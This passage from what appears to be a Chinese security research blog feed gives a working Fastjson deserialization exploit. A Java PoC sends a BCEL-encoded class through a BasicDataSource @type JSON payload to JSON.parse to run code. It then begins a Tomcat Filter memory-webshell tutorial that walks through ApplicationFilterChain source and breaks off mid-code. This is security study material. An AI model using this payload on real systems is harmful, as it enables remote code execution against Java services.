<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737024621886-c9f5661e-28a4-4733-9e85-bcb9c8e4c444.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737024621886-c9f5661e-28a4-4733-9e85-bcb9c8e4c444.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="EPEr4">实现</h4>

<p>将<code>@type</code>设为<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code>，对<code>driverClassName</code>和<code>driverClassLoader</code>进行赋值，其中Name要符合<code>$$BCEL$$</code>，而Loader要通过JSON来还原一个类加载器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;F:\\java\\RMI\\RMIServer\\target\\classes\\TestRef.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:\&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">       JSON.parse(s);</span><br><span class="line">       System.out.println(code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String path) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;File not found: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">int</span> <span class="variable">readBytes</span> <span class="operator">=</span> fis.read(bytes);</span><br><span class="line">            <span class="keyword">if</span> (readBytes != file.length()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to read the entire file: &quot;</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后成功利用，执行弹窗</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737026441543-270f389a-c84c-4e73-9131-695ba2fa7fa3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737026441543-270f389a-c84c-4e73-9131-695ba2fa7fa3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="a1DQ0">总结</h2>

<p><font style="color:rgb(80, 80, 92);">总结一下漏洞发生在反序列化的点，也就是 </font><code>Obj.parse</code><font style="color:rgb(80, 80, 92);"> 和 </font><code>Obj.parseObject</code><font style="color:rgb(80, 80, 92);"> 这里。必须的是传参要带入 class 的参数</font></p>
<p><font style="color:rgb(80, 80, 92);">PoC 是通过 String 传进去的，要以 </font><code>@type</code><font style="color:rgb(80, 80, 92);"> 打头</font></p>
<p><font style="color:rgb(80, 80, 92);">漏洞的原因是反序列化的时候去调用了 getter 和 setter 的方法</font></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>Filter内存马</title>
    <url>/2025/03/20/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="cia0D">Filter内存马</h1>

<p><font style="color:rgb(80, 80, 92);">从图中可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739971340388-3ad6b685-a309-48d8-a9c8-8aec01b51498.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739971340388-3ad6b685-a309-48d8-a9c8-8aec01b51498.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="bewEJ">环境配置</h2>

<p><font style="color:rgb(80, 80, 92);">首先在IDEA中创建Servlet，并导入tomcat依赖</font></p>
<ul>
<li>Tomcat 8.5.76</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">8.5</span><span class="number">.81</span>&lt;/version&gt;  </span><br><span class="line"> &lt;scope&gt;provided&lt;/scope&gt;  </span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>在我们的项目中构造一个Filter类<code>memFilter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">memFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter success&quot;</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改web.xml，将该filter与路径绑定，即只有访问&#x2F;filter时才会触发filter拦截器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="line">         version=<span class="string">&quot;4.0&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;filter&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;memFilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;filter&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>

<h2 id="hor2T">分析</h2>
<h3 id="bXsSe">访问/filter后</h3>

<p><font style="color:rgb(80, 80, 92);">我们在 filter.java 下的 doFilter 这个地方打断点，并且访问 &#x2F;filter 接口，断下来开始调试</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739972523121-b4c3ebbc-9779-433c-894e-4e50321f0ec9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739972523121-b4c3ebbc-9779-433c-894e-4e50321f0ec9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>步入<code>ApplicationFilterChain#doFilter</code>，<code>Globals.IS_SECURITY_ENABLED </code>用来判断一下是否开启全局服务，默认不开启</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">                            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; <span class="keyword">catch</span>( PrivilegedActionException pe) &#123;</span><br><span class="line">                <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> pe.getException();</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (ServletException) e;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (IOException) e;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (RuntimeException) e;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e.getMessage(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跳到最后的else中，进入到<code>internalDoFilter</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                  ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(</span><br><span class="line">                        filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                        ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"></span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege (<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">                ExceptionUtils.handleThrowable(e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// We fell off the end of the chain -- call the servlet instance</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(request);</span><br><span class="line">                lastServicedResponse.set(response);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;</span><br><span class="line">                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,</span><br><span class="line">                        Boolean.FALSE);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Use potentially wrapped request from this point</span></span><br><span class="line">            <span class="keyword">if</span> ((request <span class="keyword">instanceof</span> HttpServletRequest) &amp;&amp;</span><br><span class="line">                    (response <span class="keyword">instanceof</span> HttpServletResponse) &amp;&amp;</span><br><span class="line">                    Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                    ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line">                Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res&#125;;</span><br><span class="line">                SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>,</span><br><span class="line">                                           servlet,</span><br><span class="line">                                           classTypeUsedInService,</span><br><span class="line">                                           args,</span><br><span class="line">                                           principal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                servlet.service(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">            ExceptionUtils.handleThrowable(e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.servlet&quot;</span>), e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>);</span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>filter是从filters[pos++]中获取的，其中定义如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<p>filters其中存在两个filter，一个是tomcat本身自带的，另一个就是我们所定义的</p>
<blockquote>
<p>我们查找用法，其中写入值的方法只有<code>ApplicationFilterChain</code>的<code>addFilter</code>方法中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739974979952-7621ab1b-ae28-422f-b56e-2383039abd99.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739974979952-7621ab1b-ae28-422f-b56e-2383039abd99.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>而addFilter所调用的地方也只有<code>ApplicationFilterFactory</code>中<code>createFilterChain</code>的两个位置，剩下的调用会在后面与这里呼应</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739975105993-2fd6a174-e712-4a6f-8c93-f10276349fbb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739975105993-2fd6a174-e712-4a6f-8c93-f10276349fbb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
</blockquote>
<p>现在pos是1，所以目前得到的filter是tomcat的filter，下面执行<code>filter.doFilter(request, response, this);</code>（这里我的IDEA无法走入WsFilter的doFilter方法QAQ）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739973063712-75d8dbd2-840b-4511-8723-5c39536be414.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739973063712-75d8dbd2-840b-4511-8723-5c39536be414.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p> <code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;chain.doFilter()&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，会回到 </font><code>ApplicationFilterChain</code><font style="color:rgb(80, 80, 92);"> 类的 DoFilter() 方法里面</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739973469688-422a88fc-fcad-42a8-8f4a-e55a59abcd7e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739973469688-422a88fc-fcad-42a8-8f4a-e55a59abcd7e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<ul>
<li>这里理解一下，我们是filterchain，因此需要一个一个获取filter，直到获取到最后一个，很正常的一个链式调用</li>
</ul>
<p>当pos &gt; n时，就会跳出if中，经过中间一些判断，最后走到<code>servlet.service(request, response);</code></p>
<h3 id="SZLEc">访问/filter前</h3>

<p>我们想要实现filter内存马，就要明白filter是如何被创建并注册的（调用流程如下）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739974131159-d7c2321f-3fbd-476e-8f88-3ba2bc9427d4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739974131159-d7c2321f-3fbd-476e-8f88-3ba2bc9427d4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们选到<code>StandardWrapperValve</code>的<code>invoke</code>方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line">        </span><br><span class="line">        <span class="type">MessageBytes</span> <span class="variable">requestPathMB</span> <span class="operator">=</span> request.getRequestPathMB();</span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcherType</span> <span class="operator">=</span> DispatcherType.REQUEST;</span><br><span class="line">        <span class="keyword">if</span> (request.getDispatcherType()==DispatcherType.ASYNC) &#123;</span><br><span class="line">            dispatcherType = DispatcherType.ASYNC;</span><br><span class="line">        &#125;</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,</span><br><span class="line">                requestPathMB);</span><br><span class="line">        <span class="comment">// Create the filter chain for this request</span></span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span></span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Call the filter chain for this request</span></span><br><span class="line">        <span class="comment">// <span class="doctag">NOTE:</span> This also calls the servlet&#x27;s service() method</span></span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> <span class="built_in">this</span>.container;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((servlet != <span class="literal">null</span>) &amp;&amp; (filterChain != <span class="literal">null</span>)) &#123;</span><br><span class="line">                <span class="comment">// Swallow output if needed</span></span><br><span class="line">                <span class="keyword">if</span> (context.getSwallowOutput()) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        SystemLogHandler.startCapture();</span><br><span class="line">                        <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                            request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            filterChain.doFilter(request.getRequest(),</span><br><span class="line">                                    response.getResponse());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">log</span> <span class="operator">=</span> SystemLogHandler.stopCapture();</span><br><span class="line">                        <span class="keyword">if</span> (log != <span class="literal">null</span> &amp;&amp; log.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            context.getLogger().info(log);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                        request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filterChain.doFilter</span><br><span class="line">                            (request.getRequest(), response.getResponse());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中存在一个<code>createFilterChain</code>方法，会构建一个filterchain，方法代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">            Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there is no servlet to execute, return null</span></span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create and initialize a filter chain object</span></span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">            <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                <span class="comment">// Security: Do not recycle</span></span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">                <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Request dispatcher in use</span></span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Acquire the filter mappings for this Context</span></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are no filter mappings, we are done</span></span><br><span class="line">        <span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Acquire the information we will need to match filter mappings</span></span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span></span><br><span class="line">                (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">        <span class="keyword">if</span> (attribute != <span class="literal">null</span>)&#123;</span><br><span class="line">            requestPath = attribute.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add filters that match on servlet name second</span></span><br><span class="line">        <span class="keyword">for</span> (FilterMap 